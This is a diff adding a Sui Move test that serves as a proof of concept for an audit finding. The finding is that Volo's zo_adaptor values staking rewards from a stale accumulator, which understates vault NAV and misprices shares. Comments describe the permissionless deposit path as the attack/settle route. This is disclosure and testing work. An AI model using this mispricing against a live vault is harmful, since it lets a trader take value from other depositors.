@@ -1,0 +1,132 @@
+// PoC for Volo finding: volo_vault::zo_adaptor reward-staleness undervaluation.
+//
+// IN-SCOPE BUG (volo-vault/sources/adaptors/zo_adaptor.move, get_zo_position_value, lines 47-52):
+//
+//     let pending_reward_per_share =
+//         pool.pool_acc_reward_per_share() - credential.credential_v2_acc_reward_per_share();
+//     let reward_amount =
+//         (((pending_reward_per_share as u256) * (credential.credential_v2_staked_amount() as u256))
+//             / (SCALE_FACTOR as u256)) as u128;
+//
+// `pool_acc_reward_per_share()` returns the RAW STORED accumulator. The ZO pool's
+// accumulator is time-based and only advances inside the PRIVATE `refresh_pool`, which
+// runs only on deposit/withdraw/claim/add_reward/set_*. The adaptor never triggers a
+// refresh, so it values pending rewards from a stale accumulator and OMITS everything
+// accrued since the pool was last touched -> vault NAV understated -> share mispricing.
+//
+// Contrast (the audited M-02 fix present in the audited adaptors):
+//   - suilend_adaptor calls suilend_compound_interest() BEFORE reading value.
+//   - navi_adaptor uses dynamic_calculator::calculate_current_index (time-accrued on the fly).
+// The new (v1.1, unaudited) zo_adaptor does neither.
+//
+// This PoC stakes into a REAL zo_staking pool, lets time pass with no pool interaction,
+// and computes the adaptor's EXACT reward formula using the SAME public getters the
+// adaptor uses. It proves the formula yields 0 (stale) while the true settled reward is
+// large. Run from this package dir:  sui move test zo_adaptor_staleness
+#[test_only]
+module zo_staking::zzz_volo_zo_adaptor_staleness_poc {
+    use sui::balance;
+    use sui::clock;
+    use sui::coin::{Self, Coin};
+    use sui::test_scenario::{Self, Scenario, next_tx, ctx};
+
+    use zo_staking::pool::{Self, Pool, CredentialV2};
+    use zo_staking::admin::{Self, AdminCap, AclControl};
+
+    public struct SUI has drop, store {}
+    public struct USDC has drop, store {}
+
+    // Mirror of volo_vault::zo_adaptor SCALE_FACTOR (1e18) and the pool's SCALE_FACTOR.
+    const SCALE_FACTOR: u256 = 1_000_000_000_000_000_000;
+
+    fun mint<T>(scenario: &mut Scenario, amount: u64): Coin<T> {
+        coin::from_balance(balance::create_for_testing<T>(amount), ctx(scenario))
+    }
+
+    // EXACT replica of volo_vault::zo_adaptor::get_zo_position_value reward leg (lines 47-52),
+    // using the same public getters the in-scope adaptor calls.
+    fun adaptor_reward_amount(pool: &Pool<SUI, USDC>, cred: &CredentialV2<SUI, USDC>): u256 {
+        let pending_reward_per_share =
+            pool::pool_acc_reward_per_share(pool) - pool::credential_v2_acc_reward_per_share(cred);
+        (((pending_reward_per_share as u256) * (pool::credential_v2_staked_amount(cred) as u256))
+            / SCALE_FACTOR)
+    }
+
+    #[test]
+    fun test_zo_adaptor_undervalues_pending_rewards_due_to_stale_accumulator() {
+        let user = @0xA;
+        let start_time = 1000;          // seconds
+        let end_time = 100_000_000;     // far future
+        let reward_rate: u128 = 100;    // reward atomic units / second
+        let stake_amount: u64 = 1_000;
+
+        let mut scenario = test_scenario::begin(user);
+
+        // --- L1 (Entry): set up a normal staked position; no privileged setup beyond a deposit ---
+        let (admin_cap, mut acl) = admin::new_for_testing(ctx(&mut scenario));
+        let mut c = clock::create_for_testing(ctx(&mut scenario));
+        clock::set_for_testing(&mut c, (start_time - 1) * 1000);
+        pool::create_pool<SUI, USDC>(&admin_cap, &c, start_time, end_time, 0, ctx(&mut scenario));
+        next_tx(&mut scenario, user);
+        let mut pool = test_scenario::take_shared<Pool<SUI, USDC>>(&scenario);
+        pool::bump_pool_version(&admin_cap, &mut pool, ctx(&mut scenario)); // initialize pool version
+
+        // fund rewards + set rate at t = start_time
+        clock::set_for_testing(&mut c, start_time * 1000);
+        admin::add_role(&admin_cap, &mut acl, b"operator");
+        admin::add_address_to_role(&admin_cap, &mut acl, b"operator", user);
+        pool::add_reward(&mut pool, &c, mint<USDC>(&mut scenario, 1_000_000_000), ctx(&mut scenario));
+        pool::set_reward_rate(&mut acl, b"operator", &mut pool, &c, reward_rate, end_time, ctx(&mut scenario));
+
+        // stake at t = start_time + 1 -> CredentialV2 (deposit_v2 refreshes the pool, then snapshots cred.acc = pool.acc)
+        clock::set_for_testing(&mut c, (start_time + 1) * 1000);
+        pool::deposit_v2<SUI, USDC>(&mut pool, &c, mint<SUI>(&mut scenario, stake_amount), ctx(&mut scenario));
+        next_tx(&mut scenario, user);
+        let mut cred = test_scenario::take_from_sender<CredentialV2<SUI, USDC>>(&scenario);
+
+        let acc_at_deposit = pool::pool_acc_reward_per_share(&pool);
+
+        // --- 1 hour passes with NO interaction on the pool (so refresh_pool is never called) ---
+        let elapsed_secs: u64 = 3_600;
+        clock::set_for_testing(&mut c, (start_time + 1 + elapsed_secs) * 1000);
+
+        // --- L2 (State flip): the accumulator the adaptor reads is STALE (unchanged since deposit) ---
+        let acc_stale = pool::pool_acc_reward_per_share(&pool);
+        assert!(acc_stale == acc_at_deposit, 100); // getter does NOT accrue time-based rewards
+
+        // What the in-scope adaptor computes RIGHT NOW (what feeds vault NAV):
+        let reward_value_as_adaptor_sees_it = adaptor_reward_amount(&pool, &cred);
+        assert!(reward_value_as_adaptor_sees_it == 0, 101); // omits an entire hour of accrual
+
+        // --- Settle the pool via an UNPRIVILEGED third party (matches the real attack/settle path) ---
+        // pool::deposit_v2 is `public` (permissionless) and calls the private refresh_pool, so ANY outsider's
+        // ordinary deposit accrues the elapsed hour. refresh_pool runs on the OLD total stake before the new
+        // 1-unit stake is added, so the victim's settled reward is unchanged (360_000). This is stronger than
+        // a privileged/donation `add_reward` and demonstrates that no special role is needed to settle.
+        let third_party = @0xB;
+        next_tx(&mut scenario, third_party);
+        pool::deposit_v2<SUI, USDC>(&mut pool, &c, mint<SUI>(&mut scenario, 1), ctx(&mut scenario));
+        let acc_settled = pool::pool_acc_reward_per_share(&pool);
+        assert!(acc_settled > acc_stale, 102); // real accrual existed all along
+
+        // The true (settled) reward valuation the adaptor SHOULD have reported:
+        let reward_value_settled = adaptor_reward_amount(&pool, &cred);
+
+        // --- L3 (Outcome): adaptor undervalued the position's reward leg by the full hour ---
+        // Expected settled reward = elapsed * rate * (staked / total_staked) = 3600 * 100 * 1 = 360_000
+        assert!(reward_value_settled == 360_000, 103);
+        assert!(reward_value_as_adaptor_sees_it < reward_value_settled, 104);
+
+        // The exact USD-relevant undervaluation (before oracle price multiply, which is monotonic):
+        let undervaluation = reward_value_settled - reward_value_as_adaptor_sees_it; // = 360_000
+        assert!(undervaluation == 360_000, 105);
+
+        // cleanup (cred belongs to the victim @0xA; the current sender is the third party @0xB)
+        test_scenario::return_to_address(user, cred);
+        test_scenario::return_shared(pool);
+        transfer::public_transfer(admin_cap, user);
+        transfer::public_transfer(acl, user);
+        clock::destroy_for_testing(c);
+        test_scenario::end(scenario);
+    }
+}
